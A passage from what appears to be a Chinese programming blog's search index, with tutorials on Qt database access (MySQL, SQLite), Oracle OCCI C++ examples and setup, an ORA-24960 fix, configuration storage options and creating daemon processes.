配置构建套件（Kit），具体位置在菜单栏-工具-选项-Kits-构建套件（Kit）中。之前没有SDK或者其他原因，你的套件前面就会有一个黄色的感叹号。这种你就可以自己更改他的设置： 或者你可以自己新建一个，具体配置如下： 注意：这里MSVC的kit需要你自己配置，不配是不会自动识别的 附文一：安装VS2017并配置QT 打开VS2017，菜单栏 工具-&gt; 扩展和更新，点击 联机 然后搜索qt，下载 下载完成后，关闭VS2017，出现以下安装画面，在其初始化完成后点击“修改”，等待配置完成即可 再次打开VS 2017，菜单栏出现 Qt VS tools，新建项目也出现QT项目选项 底部输出框出现： 菜单栏 -&gt; Qt Vs tools -&gt; Qt options -&gt; Add，添加如下路径 环境变量配置： 这台电脑 -&gt; 属性 -&gt; 高级系统设置 -&gt; 环境变量 ，添加Path变量： 注意：将C:\\Program Files(x86)\\Windows Kits\\10\\bin\\10.0.17134.0\\x64添加到系统环境变量的Path中去。 ​ Win10 系统环境变量修改方法：此电脑——属性——高级系统设置——高级——环境变量——系统变量——Path——编辑。将路径复制进去后，点击保存便可。 安装配置完成","categories":[{"name":"Qt","slug":"Qt","permalink":"https://xiaowuyoucy.github.io/categories/Qt/"}],"tags":[]},{"title":"Qt操作数据库","slug":"Qt操作数据库","date":"2022-06-12T15:53:03.000Z","updated":"2022-06-15T16:17:20.443Z","comments":true,"path":"2022/06/12/Qt操作数据库/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/12/Qt操作数据库/","excerpt":"","text":"Qt 编译oracle的OCI驱动 源码安装的时候必须选择Sources选项, 里边有数据库驱动的源码 版本和路径说明: Qt版本是Qt5.9.0，安装路径是默认的 C:\\Qt\\Qt5.9.0 Oracle客户端版本oracle 11g 安装路径是C:\\Oracle\\product\\11.2.0\\client_1 打开C:\\Qt\\Qt5.9.0\\5.9\\Src\\qtbase\\src\\plugins\\sqldrivers\\oci\\ 目录下面的oci.pro。 使用QtCreator打开oci.pro 未进行修改的直接编译结果： Library ‘oci’ is not defined. 修改oci.pro文件 之后再重新编译，就会发现编译通过了，这时候我们在Qt安装的 根目录下面去找 “:\\plugins”会发现里面有一个“ sqldrivers ” 文件夹，将其复制到Qt的c:\\Qt\\Qt5.9.0\\5.9\\mingw53_32\\plugins下 面即可。 如果Qt安装根目录在C盘, 那么plugins就在C盘根目录 编译的时候建议编译两个版本 debug release 以上方法对Qt5.8以后的版本都适用. QT操作mysql数据库 Header: include qmake: QT += sql 首先需要在QT项目文件的*.pro文件中添加: QT += core gui sql 所用到的头文件: 12345#include &lt;qDebug&gt;#include &lt;QSqlDatabase&gt;#include &lt;QSqlQuery&gt;#include &lt;QSqlRecord&gt;#include &lt;QSqlError&gt; 1.加载数据库驱动 将libmysql.dll库放到下面的目录下: D:\\QT\\Qt5.10.1\\5.10.1\\mingw53_32\\bin 12345//查看QT支持的驱动qDebug() &lt;&lt; QSqlDatabase::drivers();输出结果为://(\"QSQLITE\", \"QMYSQL\", \"QMYSQL3\", \"QOCI\", \"QOCI8\", \"QODBC\", \"QODBC3\", \"QPSQL\", \"QPSQL7\")QSqlDatabase db = QSqlDatabase::addDatabase(\"QMYSQL\"); 2.设置账号密码 12345678910111213设置账号和密码信息使用QSqlDatabase类的成员函数:void setHostName(const QString &amp;host)void setPassword(const QString &amp;password)void setPort(int port)void setUserName(const QString &amp;name)void setDatabaseName(const QString &amp;name)使用方法, 如下所示db.setHostName(\"192.168.10.145\"); //设置mysql主机的IP地址db.setDatabaseName(\"scott\"); //设置数据库名db.setUserName(\"root\"); //设置用户名db.setPassword(\"123456\"); //设置密码其实上面这几步就类似于登录mysql数据库需要的关键信息:mysql -h192.168.10.145 -uroot -p123456 scott 3.打开数据库 12345678bool QSqlDatabase::open()详情查看QT帮助手册使用方法, 如下所示:if(!db.open())&#123; qDebug() &lt;&lt; \"数据库操作失败\"; return;&#125; 4.执行select查询操作 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960611 需要使用QSqlQuery类的相关函数:Header: #include &lt;QSqlQuery&gt;2 QSqlQuery类的构造函数:QSqlQuery(const QString &amp;query = QString(), QSqlDatabase db = QSqlDatabase())该构造函数都有默认值, 构造的时候可以不指定:用法: QSqlQuery query;3 执行select查询语句 3.1 第一种方法, 直接调用exec执行sql语句 例如: query.exec(\"select * from dept\"); 3.2 第二种方法,先调用prepare准备一个sql语句, 然后再执行exec执行sql语句 例如: bool success; query.prepare(\"select * from dept\"); success = query.exec(); if(!success) &#123; qDebug() &lt;&lt; \"查询失败\"; return; &#125;4 获取查询表的总字段数 先调用QSqlQuery类的record方法: QSqlRecord record() const; 然后在调用QSqlRecord类的count方法 int QSqlRecord::count() const 例如: QSqlRecord rec = query.record(); qDebug() &lt;&lt; \"查询结果字段总数为：\" &lt;&lt; rec.count(); //注意: 有的函数有代码示例, 可以直接参考5 获取查询结果总记录数 调用QSqlQuery类的size方法: int size() const 例如: qDebug() &lt;&lt; \"查询结果记录总数为\" &lt;&lt; query.size();6 遍历查询的结果集 获取每一条记录: bool QSqlQuery::next() 通过列的索引位置获取列的值---列的索引从0开始 QVariant QSqlQuery::value(int index) const 通过列名获取列的值: QVariant value(const QString &amp;name) const 代码示例: while(query.next()) &#123; //qDebug() &lt;&lt; query.value(0).toInt() &lt;&lt; query.value(1).toString() &lt;&lt; query.value(2).toString(); qDebug() &lt;&lt; query.value(\"deptno\").toInt() &lt;&lt; query.value(\"dname\").toString() &lt;&lt; query.value(\"loc\").toString(); &#125;7 移动指向结果集的位置指针: bool QSqlQuery::seek(int index, bool relative = false) 例如: query.seek(-1); //每次next都会使记录指针移动一次, 可以使用seek函数重置指针位置,类似于文件指针 5.执行insert操作 123456789101112131415161718192021222324252627282930方法1: query.prepare(\"insert into dept values(77, 'sports', 'xiuzheng')\"); success = query.exec(); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"插入失败：\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125;方法2: 使用带有占位符的sql语句, 该语句不是一个完整的sql语句,需要调用bindValue函数给占位符设置值. query.prepare(\"insert into dept values(?, ?, ?)\"); //给字段设置值,字段位置索引从0开始 query.bindValue(0, 99); query.bindValue(1, \"SPORTS\"); query.bindValue(2, \"BEIJING\"); success = query.exec(); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"插入失败：\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125;方法3:直接调用exec并将sql语句作为参数也可以直接插入 success = query.exec(\"insert into dept values(66, 'SALES', 'SHANGHAI')\"); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"插入失败：\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125; 6.执行update操作 12345678910111213141516171819方法1:直接调用execl并将sql语句作为参数执行 success = query.exec(\"update dept set loc='MEIGUO' where deptno=99\"); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"update failed\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125;方法2:使用带有占位符占位符的sql语句 query.prepare(\"update dept set loc=? where deptno=?\"); query.bindValue(0, \"JAPAN\"); query.bindValue(1, 77); success = query.exec(); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"update failed\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125; 7.执行delete操作 12345678910111213方法1:直接调用execl并将sql语句作为参数执行 query.exec(\"delete from dept where deptno=99\");方法2:使用带有占位符的sql语句 query.prepare(\"delete from dept where deptno=? or loc=?\"); query.bindValue(0, 77); query.bindValue(1, \"SHANGHAI\"); success = query.exec(); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"update failed\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); return; &#125; 8.事务处理 12345678910111213141516171819202122232425261 开启事务 query.exec(\"START TRANSACTION\"); 2 设置自动提交和手动提交----&gt;默认情况下mysql是自动提交的 query.exec(\"SET AUTOCOMMIT=0\"); //手动提交 query.exec(\"SET AUTOCOMMIT=1\"); //自动提交 3 事务的提交和回滚操作 query.exec(\"COMMIT\"); query.exec(\"ROLLBACK\");测试方法: 先开启一个新的事务, 并设置为手动提交, 然后插入数据, 最后回滚, 看数据是否已经插入到数据库中;然后在修改为提交, 查看数据是否已经插入到数据库中.测试代码如下: query.exec(\"START TRANSACTION\"); query.exec(\"SET AUTOCOMMIT=0\"); //手动提交 success = query.exec(\"insert into dept values(99, 'SALES', 'SHANGHAI')\"); if(!success) &#123; QSqlError lastError = query.lastError(); qDebug() &lt;&lt; \"update failed\" &lt;&lt; lastError.driverText() &lt;&lt; lastError.databaseText(); //回滚事务 query.exec(\"ROLLBACK\"); return; &#125; //提交事务 query.exec(\"COMMIT\"); 9.关闭数据库 12//关闭数据库db.close(); 参考网站: https://blog.csdn.net/wyansai/ 创建sqlite数据库的过程—同mysql 建好sqlite数据库之后, 可以看到如下图所示: 参考网站: https://www.cnblogs.com/xia-weiwen/archive/2017/05/04/6806709.html 参考代码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207在QT上建立一个控制台应用程序, 然后将代码直接复制上就可以编译测试.还有就是需要在*.pro文件中添加: QT += sql#include &lt;QCoreApplication&gt;#include &lt;QSqlDatabase&gt;#include &lt;QSqlError&gt;#include &lt;QSqlQuery&gt;#include &lt;qDebug&gt;#include &lt;QString&gt;int main(int argc, char *argv[])&#123; QCoreApplication a(argc, argv); bool success; //建立数据库--加载数据库驱动 QSqlDatabase database; if (QSqlDatabase::contains(&quot;qt_sql_default_connection&quot;)) &#123; database = QSqlDatabase::database(&quot;qt_sql_default_connection&quot;); &#125; else &#123; database = QSqlDatabase::addDatabase(&quot;QSQLITE&quot;); database.setDatabaseName(&quot;C:\\\\Users\\\\Administrator\\\\Desktop\\\\sqlite.db&quot;); //db.setDatabaseName(&quot;main&quot;);//有这个会报错 //database.setUserName(&quot;&quot;);//可以省略 //database.setPassword(&quot;&quot;);//可以省略 &#125; //打开数据库 if (!database.open()) &#123; qDebug() &lt;&lt; &quot;Error: Failed to connect database.&quot; &lt;&lt; database.lastError(); return -1; &#125; //##################################################################### //--新建一个表student作为测试表 //##################################################################### //执行sql语句---新建一个表 QSqlQuery sql_query; /*QString create_sql = &quot;create table student (id int, name varchar(30), age int)&quot;; sql_query.prepare(create_sql); success = sql_query.exec(); if(!success) &#123; qDebug() &lt;&lt; &quot;Error: Fail to create table.&quot; &lt;&lt; sql_query.lastError(); return -1; &#125; else &#123; qDebug() &lt;&lt; &quot;Table created!&quot;; &#125;*/ //##################################################################### //--插入数据操作 //##################################################################### //向student表中插入数据 //第一种方法: /*success = sql_query.exec(&quot;insert into student values(1, &apos;xiaowen&apos;, 10)&quot;); if(!success) &#123; qDebug() &lt;&lt; &quot;Error: Fail to create table.&quot; &lt;&lt; sql_query.lastError(); return -1; &#125;*/ //第二种方法: QString sql = &quot;insert into student values(3, &apos;xiaozi&apos;, 25)&quot;; success = sql_query.exec(sql); if(!success) &#123; qDebug() &lt;&lt; &quot;Error: Fail to create table.&quot; &lt;&lt; sql_query.lastError(); return -1; &#125; //第三种方法:执行带有占位符的sql语句 QString insert_sql = &quot;insert into student values (?, ?, ?)&quot;; sql_query.prepare(insert_sql); /*sql_query.addBindValue(2); sql_query.addBindValue(&quot;xiaohu&quot;); sql_query.addBindValue(22);*/ sql_query.bindValue(0, 5); sql_query.bindValue(1, &quot;小马&quot;); sql_query.bindValue(2, 30); success = sql_query.exec(); if(!success) &#123; qDebug() &lt;&lt; sql_query.lastError(); return -1; &#125; else &#123; qDebug() &lt;&lt; &quot;inserted success!&quot;; &#125; //批量插入 insert_sql = &quot;insert into student values(?,?,?)&quot;; sql_query.prepare(insert_sql); QVariantList GroupIDs; GroupIDs.append(0); GroupIDs.append(1); GroupIDs.append(2); QVariantList GroupNames; GroupNames.append(&quot;xiaoma&quot;); GroupNames.append(&quot;xiaowei&quot;); GroupNames.append(&quot;xiaolian&quot;); QVariantList GroupAddress; GroupAddress.append(10); GroupAddress.append(15); GroupAddress.append(18); sql_query.addBindValue(GroupIDs); sql_query.addBindValue(GroupNames); sql_query.addBindValue(GroupAddress); success = sql_query.execBatch(); if(!success) &#123; qDebug()&lt;&lt;sql_query.lastError(); return -1; &#125; else &#123; qDebug()&lt;&lt;&quot;insert batch data succ&quot;; &#125; return 0; //##################################################################### //--更新数据 //##################################################################### //QString update_sql = &quot;update student set name = :name where id = :id&quot;; QString update_sql = &quot;update student set name = ? where id = ?&quot;; sql_query.prepare(update_sql); //sql_query.bindValue(&quot;:name&quot;, &quot;Qt&quot;); //sql_query.bindValue(&quot;:id&quot;, 1); sql_query.bindValue(0, &quot;Qt&quot;); sql_query.bindValue(1, 2); success = sql_query.exec(); if(!success) &#123; qDebug() &lt;&lt; sql_query.lastError(); return -1; &#125; else &#123; qDebug() &lt;&lt; &quot;updated!&quot;; &#125; //##################################################################### //--查询数据 //##################################################################### QString select_sql = &quot;select id, name from student&quot;; success = sql_query.exec(); if(!success) &#123; qDebug()&lt;&lt;sql_query.lastError(); &#125; else &#123; while(sql_query.next()) &#123; int id = sql_query.value(0).toInt(); QString name = sql_query.value(1).toString(); qDebug()&lt;&lt;QString(&quot;id:%1 name:%2&quot;).arg(id).arg(name); &#125; &#125; //查询最大的ID QString select_max_sql = &quot;select max(id) from student&quot;; int max_id = 0; sql_query.prepare(select_max_sql); success = sql_query.exec(); if(!success) &#123; qDebug() &lt;&lt; sql_query.lastError(); &#125; else &#123; while(sql_query.next()) &#123; max_id = sql_query.value(0).toInt(); qDebug() &lt;&lt; QString(&quot;max id:%1&quot;).arg(max_id); &#125; &#125; //##################################################################### /--删除数据 //##################################################################### QString delete_sql = &quot;delete from student where id = ?&quot;; sql_query.prepare(delete_sql); sql_query.addBindValue(3); success = sql_query.exec(); if(!success) &#123; qDebug()&lt;&lt;sql_query.lastError(); return -1; &#125; else &#123; qDebug()&lt;&lt;&quot;deleted!&quot;; &#125; //清空表 /*QString clear_sql = &quot;delete from student&quot;; sql_query.prepare(clear_sql); success = sql_query.exec(); if(!success) &#123; qDebug() &lt;&lt; sql_query.lastError(); return -1; &#125; else &#123; qDebug() &lt;&lt; &quot;table cleared&quot;; &#125;*/ //关闭数据库 database.close(); return a.exec();&#125;","categories":[{"name":"Qt","slug":"Qt","permalink":"https://xiaowuyoucy.github.io/categories/Qt/"}],"tags":[]},{"title":"ORA-24960错误","slug":"ORA-24960错误","date":"2022-06-10T14:55:45.000Z","updated":"2022-06-12T15:43:29.748Z","comments":true,"path":"2022/06/10/ORA-24960错误/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/10/ORA-24960错误/","excerpt":"","text":"Ubuntu ORA-24960:属性OCI_ATTR_USERNAME大于最大允许长度255 问题描述 我正在尝试在Ubuntu上运行以下测试程序，以使用即时客户端OCCI库连接到oracle数据库. 123456789101112#include &lt;iostream&gt;#include &lt;occi.h&gt;using namespace oracle::occi;int main() &#123; Environment *env = Environment::createEnvironment(Environment::DEFAULT); Connection *conn = env-&gt;createConnection( &quot;user&quot;, &quot;1234&quot; ); env-&gt;terminateConnection(conn); Environment::terminateEnvironment(env);&#125; 编译时没有错误 但是运行时我会得到 123terminate called after throwing an instance of &apos;oracle::occi::SQLException&apos; what(): ORA-24960: the attribute OCI_ATTR_USERNAME is greater than the maximum allowable length of 255Aborted 推荐答案 通过还原到较早的编译器解决了该问题. 12$ sudo apt-get install g++-4.8$ g++-4.8 main.cpp -L ~/instantclient_12_2 -locci -lclntsh -I ~/instantclient_12_2/sdk/include 也许最新的编译器和库与用于构建OCCI库的编译器和库不兼容.","categories":[{"name":"编程错误总结","slug":"编程错误总结","permalink":"https://xiaowuyoucy.github.io/categories/编程错误总结/"}],"tags":[]},{"title":"oracle_win和linux编程","slug":"oracle-win和linux编程","date":"2022-06-08T14:40:24.000Z","updated":"2022-06-17T13:54:38.013Z","comments":true,"path":"2022/06/08/oracle-win和linux编程/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/08/oracle-win和linux编程/","excerpt":"","text":"关于信号处理函数的经验: 1 在信号处理函数中尽可能的要简单 2 在信号处理函数中不要打印日志. windows 需要安装oracle服务端对应版本的oracle客户端才行 比如服务端版本是10.0.1 客户端也必须是10.0.1版本,否则库加载失败或编译不通过 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;iostream&gt;#include &lt;occi.h&gt;#include &lt;string&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;using namespace std;using namespace oracle::occi;int main()&#123; //初始化环境 Environment *ev = Environment::createEnvironment(); if (ev == NULL) &#123; cout &lt;&lt; \"createEnvironment failed\" &lt;&lt; endl; return -1; &#125; //连接oracle数据库 string user = \"scott\"; string passwd = \"tiger\"; string connstr = \"192.168.10.145:1521/orcl\"; Connection *conn = ev-&gt;createConnection(user, passwd, connstr); if (conn == NULL) &#123; cout &lt;&lt; \"connect database failed\" &lt;&lt; endl; return -1; &#125; cout &lt;&lt; \"connect database OK\" &lt;&lt; endl; //sql语句中不要有分号 /*string sql = \"insert into dept values(109, 'lajiao', 'JYL_SC')\"; Statement *stmt = conn-&gt;createStatement(sql); stmt-&gt;execute();*/ string sql = \"delete from dept where deptno=99\"; Statement *stmt = conn-&gt;createStatement(sql); stmt-&gt;executeUpdate(); //关闭连接 ev-&gt;terminateConnection(conn); //释放环境资源 Environment::terminateEnvironment(ev); return 0;&#125; Linux 初始化环境 1234Environment *env = Environment::createEnvironment();成功:返回指针对象失败:返回NULL 连接数据库 1234567Connection *Environment::createConnection(const string &amp;userName,const string &amp;password, const string &amp;connectString );userName: 用户名password: 用户密码connectString: ip地址:端口/实例名成功: 返回指针对象失败: 返回NULL 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;iostream&gt;#include &lt;occi.h&gt;#include &lt;string&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;using namespace std;using namespace oracle::occi;int main()&#123; //初始化环境 Environment *env = Environment::createEnvironment(); if(env==NULL) &#123; cout &lt;&lt; \"create Environment error\" &lt;&lt; endl; return -1; &#125; //连接数据库 //Connection *Environment::createConnection( //const string &amp;userName,const string &amp;password, const string &amp;connectString ); string user=\"scott\"; string passwd=\"tiger\"; string connstr=\"192.168.10.145:1521/orcl\"; Connection *conn = env-&gt;createConnection(user, passwd, connstr); if(conn==NULL) &#123; cout &lt;&lt;\"connect database error\" &lt;&lt; endl; return -1; &#125; cout &lt;&lt; \"connect database OK!\" &lt;&lt; endl; Statement *stmt = NULL; string sql = \"insert into dept values(11, 'training', 'changping')\"; //创建Statement对象 //第一种方法 /*stmt = conn-&gt;createStatement(sql); stmt-&gt;execute();*/ //第二种方法 /*sql = \"insert into dept values(21, 'sport', 'JYL')\"; stmt = conn-&gt;createStatement(); stmt-&gt;setSQL(sql); stmt-&gt;execute();*/ //第三种方法 /*sql = \"insert into dept values(31, 'SALES', 'JYL')\"; stmt = conn-&gt;createStatement(); stmt-&gt;execute(sql);*/ //第四种方法 /*sql = \"insert into dept values(41, 'XIANGLIAO', 'JYL')\"; stmt = conn-&gt;createStatement(); int num = stmt-&gt;executeUpdate(sql); cout &lt;&lt; \"num==\" &lt;&lt; num &lt;&lt; endl;*/ //第五种方法 /*sql = \"insert into dept values(51, 'huoguo', 'JYL')\"; stmt = conn-&gt;createStatement(sql); int num = stmt-&gt;executeUpdate(); cout &lt;&lt; \"num==\" &lt;&lt; num &lt;&lt; endl;*/ //第六种方法 /*sql = \"insert into dept values(:1, :2, :3)\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;setInt(1, 61); stmt-&gt;setString(2, \"huajiao\"); stmt-&gt;setString(3, \"JYL_SC\"); stmt-&gt;executeUpdate();*/ //执行delete操作 /*sql = \"delete from dept where deptno=11\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;executeUpdate();*/ //使用占位符的删除操作 /*sql = \"delete from dept where deptno=:1\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;setInt(1, 21); stmt-&gt;executeUpdate();*/ //执行update操作 /*sql = \"update dept set dname='xxxxx' where deptno=31\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;executeUpdate();*/ //使用占位符的update操作 /*sql = \"update dept set dname='yyyy' where deptno=:1\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;setInt(1, 41); stmt-&gt;executeUpdate();*/ //执行select查询 /*sql = \"select * from dept\"; stmt = conn-&gt;createStatement(sql);*/ sql = \"select * from dept where deptno&gt;:1\"; stmt = conn-&gt;createStatement(sql); stmt-&gt;setInt(1, 30); ResultSet *rs = stmt-&gt;executeQuery(); //循环获取结果集的每一行记录的值 while(rs-&gt;next()) &#123; cout &lt;&lt; rs-&gt;getInt(1) &lt;&lt; \" \" &lt;&lt; rs-&gt;getString(2) &lt;&lt; \" \" &lt;&lt; rs-&gt;getString(3) &lt;&lt; endl; &#125; //关闭结果集 stmt-&gt;closeResultSet(rs); //端口数据库连接 env-&gt;terminateConnection(conn); //关闭环境 Environment::terminateEnvironment(env);&#125;","categories":[{"name":"linux","slug":"linux","permalink":"https://xiaowuyoucy.github.io/categories/linux/"}],"tags":[]},{"title":"保存配置信息的几种方式","slug":"保存配置信息的几种方式","date":"2022-06-05T11:23:18.000Z","updated":"2022-06-05T11:25:10.003Z","comments":true,"path":"2022/06/05/保存配置信息的几种方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/05/保存配置信息的几种方式/","excerpt":"","text":"保存配置信息的几种方式: 1 配置文件: ​ 1.1 用户自定义的格式: 1234user:scottpasswd:tigerSID:orclsocott|tiger|orcl ​ 1.2 xml格式的配置文件 ​ 1.3 json格式的配置文件 2 将配置信息设置成环境变量 1char *p = getenv(&quot;HOME&quot;); //获取环境变量的值 3 存到数据库表中 将配置信息写入配置文件有什么好处? 省去编译源代码的麻烦,只要修改配置文件之后重启服务即可","categories":[{"name":"多端安全协议传输平台","slug":"多端安全协议传输平台","permalink":"https://xiaowuyoucy.github.io/categories/多端安全协议传输平台/"}],"tags":[]},{"title":"OCCI","slug":"OCCI","date":"2022-06-05T00:38:09.000Z","updated":"2022-06-05T11:22:19.063Z","comments":true,"path":"2022/06/05/OCCI/","link":"","permalink":"https://xiaowuyoucy.github.io/2022/06/05/OCCI/","excerpt":"","text":"编写服务端程序 服务端使用多线程处理多个客户端连接, 一个线程处理一个客户端连接, 一个客户端需要使用一个TcpSocket对象, 可以使用map完成线程ID和TcpSocket的映射关系, map&lt;pthread_t, TcpSocket *&gt;m_listSocket; 线程的回调函数需要访问到服务端操作类的成员变量, 所以应该将回调函数设置为类的友元函数. 1234auto it = m_socketList.find(threadId);----&gt;自动类型推导但是如果it是先定义后赋值不行:auto it;it = m_socketList.find(threadId); 在使用SHA1进行加密的时候, 函数参数是什么类型, 就提供什么类型的数据, 否则可能会有问题. 守护进程 守护进程特点 后台服务进程 独立于控制终端 周期性执行某任务 不受用户登录注销影响 一般采用以d结尾的名字(服务) 创建守护进程的流程 创建子进程, 杀死父进程 - 必须的 创建子进程: fork(); 守护进程是怎么来的? 有一个没有任何职务的进程才可以被加官进爵, 守护进程是一个会话 范围: 进程 -&gt; 进程组 -&gt; 会话 进程组中的组长: 默认是进程组中的第一个进程 如何杀死父进程 exit(0) kill() raise() -&gt; 自己给自己发信号 abort() -&gt; 给自己发送SIGABRT信号 子进程提升为会话 - 必须的 setsid() 提升成功之后, 进程就脱离了终端 修改工作目录 - 可选 chdir(); /mnt/U盘1/app 在当前目录/mnt/U盘1/下 执行 ./app, 进程的工作路径: /mnt/U盘1/ 将工作目录切换到一个不能被卸载的路径下就可以了 chdir(&quot;/home&quot;); 修改掩码 - 可选 umask(); 关闭/重定向文件描述法 - 可选 标准输入 -&gt; 0 标准输出 -&gt; 1 标准错误 -&gt; 2 如果的重定向, 对应的位置: /dev/null /dev/null是一个黑洞文件,不管放什么数据进去,文件大小都是0 重定向的目的: 排除干扰 1234int devFd = open(&quot;/dev/null&quot;, O_RDWR);int dup2(int oldfd, int newfd);dup2(devFd, 0);newfd 不管之前指向哪一个文件, 现在指向oldfd 核心处理动作 -&gt; 周期性的执行某些操作 - 必须 关闭守护进程 -&gt; 使用shell脚本管理 - 可选 OCCI Oracle C调用接口 – OCCI 即 Oracle C Call Interface OCCI 是Oracle 的C++ API, 允许你使用面向对象的特性、本地类、C++语言的方法来访问Oracle数据库 OCCI 介绍 优势 基于标准C++和面向对象的设计； 效率较高； 适合开发C/S模式的程序，软件中间层； 特性 完整支持SQL/PLSQL 为不断增长的用户和请求提供了弹性选项 为使用用户自定义类型，如C中的类，提供了无缝接口 支持所有的Oracle数据类型以及LOB types（大对象） 可以访问数据库元数据 OCCI 头文件 12345#include &lt;occi.h&gt; -- 程序中只需要包含这一个头文件#include &lt;occiCommon.h&gt;#include &lt;occiControl.h&gt;#include &lt;occiData.h&gt;#include &lt;occiObjects.h&gt; OCCI 库 Windows oraocci11.lib/ oraocci11d.lib oraocci11.dll/ oraocci11d.dll Linux libnnz11.so libocci.so libclntsh.so linux下的环境配置-----root用户下进行配置 将oracle_client_11gR2.tar.gz文件上传值linux操作系统的/opt目录下 执行tar -zxvf oracle_client_11gR2.tar.gz解压至当前目录下 进入到刚刚解压的目录, 打开&lt;&lt;Hi-看我,看我.sh&gt;&gt; 将文件中的export导出的环境变量拷贝到root用户的.bashrc文件中 注意: 若解压的目录不是/opt, 环境变量中的路径需要修改 执行. .bashrc或者source .bashrc 或者退出再次登录使配置的环境变量生效 可以执行echo $OCCI_HOME进行查看, 若看到内容则设置成功 切换到/opt/instantclient_11_2/network/admin目录下 打开tnsnames.ora文件, 修改其中的HOST部分, 将IP修改成实际的oracle服务的IP地址 occi.cpp测试代码上传到root用户下 然后执行: g++ -o a.out occi.cpp -locci -lclntsh, 编译通过表明设置的没有问题. 若执行报错, 查看一下代码中的oracle的用户名和密码是否正确. 常见的几个环境变量: 123456789101112PATH:命令或者可执行程序搜索的路径C_INCLUDE_PATH:gcc编译器查找头文件的路径CPLUS_INCLUDE_PATH: g++编译器查找头文件的路径LD_LIBRARY_PATH:查找动态链接库的路径LIBRARY_PATH: 查找静态库的路径若编译的时候使用静态库文件:则: gcc foo.c -L /home/itcast/lib -static -lfoo -o foo 123456789101112131415oracle用户安装了oracle服务系统, 本身就有oracle编程需要的库文件和头文件:&gt; export OCCI_HOME=/u01/app/oracle/product/11.2.0/db_1&gt; export OCCI_INCLUDE_DIR=$OCCI_HOME/rdbms/public&gt; export OCCI_LIBRARY_PATH=$OCCI_HOME/lib&gt; export LD_LIBRARY_PATH=$$LD_LIBRARY_PATH:$OCCI_LIBRARY_PATH&gt;&gt; 程序编译时搜索的库目录&gt;&gt; export LIBRARY_PATH=$$LIBRARY_PATH:$OCCI_LIBRARY_PATH&gt;&gt; 程序编译时搜索的头文件目录&gt;&gt; export CPLUS_INCLUDE_PATH=$$CPLUS_INCLUDE_PATH:$OCCI_INCLUDE_DIR&gt;&gt; 上面的环境变量中OCCI_HOME和OCCI_INCLUDE_DIR与在root中的配置不同, 其余相同 OCCI使用 初始化 - Environment 类 OCCI通过创建一个Environment的对象完成初始化工作。 可以通过Environment创建数据库连接，从而进行其它的操作 要创建Environment，应该调用Environment类的静态方法createEnvironment() 1234// 环境初始化Environment* env = Environment::createEnvironment();// 关闭, 释放资源Environment::terminateEnvironment(env); 连接数据库 - Connection 类 连接数据库通过Connection类的对象实例实现 调用Environment类的createConnection()方法可以创建一个Connection对象； 123// 函数原型:Connection *Environment::createConnection(const string &amp;userName,const string &amp;password, const string &amp;connectString ); 12345// 函数调用const string userName = &quot;scott&quot;; // 用户名const string passwd = &quot;tiger&quot;; // 密码const string connstr = &quot;192.168.247.129:1521/orcl&quot;; // 数据库连接串Connection* conn = env-&gt;createConnection(userName, passwd, connstr); 使用Environment::terminateConnection()断开连接 12// 断开连接env-&gt;terminateConnection(conn); 执行SQL Statement 类用于执行SQL语句,并获取返回结果。 ResultSet 类用于处理SELECT 查询的结果。 对于所有类型的数据的绑定或者获取，OCCI都提供了统一的方法 setXXX 方法用于Statement getXXX 方法用于Statement &amp; ResultSet OCCI会自动处理类型之间的转换。 使用方法： 使用Connection::createStatement()创建Statement对象, 指定 SQL 命令(DDL/DML/query)作为参数 12345678910// 操作函数Connection::createStatement(string &amp;sql);Statement::setSQL(string &amp;sql);Statement::execute(string &amp;sql); // can be used for any SQL, returns statusStatement::executeUpdate(string &amp;sql); // returns Insert/Update/Delete countStatement::executeQuery(string &amp;sql); // returns ResultSet（结果集） 使用 setXXX 方法传递要绑定用于输入的值 使用合适的execute方法执行SQL 对于SELECT 查询, 使用ResultSet 对象处理返回结果 12345// 插入操作Statement *stmt = conn-&gt;createStatement(“ insert into Dept(Deptno,Dname, Loc) values (1,‘ACCOUNTS’, ‘ZONE1’ ”);stmt-&gt;executeUpdate();conn-&gt;terminateStatement(stmt); // 关闭查询, 释放资源 使用绑定参数的DML（数据操作语句）示例： 12345678Statement *stmt = conn-&gt;createStatement(“ insert into Emp(EmpNo,Ename) values(:1, :2) ”);//1 and 2 are bind placeholdersint empno = 2;string empname = “JOHN W”;//first parameter is bind position, second is valuestmt-&gt;setInt(1, empno);stmt-&gt;setString(2, empname);stmt-&gt;executeUpdate(); 执行SELECT查询并处理结果： 